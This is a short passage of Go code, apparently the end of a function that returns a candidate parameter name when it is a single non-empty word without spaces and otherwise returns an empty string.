				// Looks like a param name if it's a single word without spaces
				if !strings.Contains(candidate, " ") && len(candidate) > 0 {
					return candidate
				}
			}
		}
	}
	return ""
}
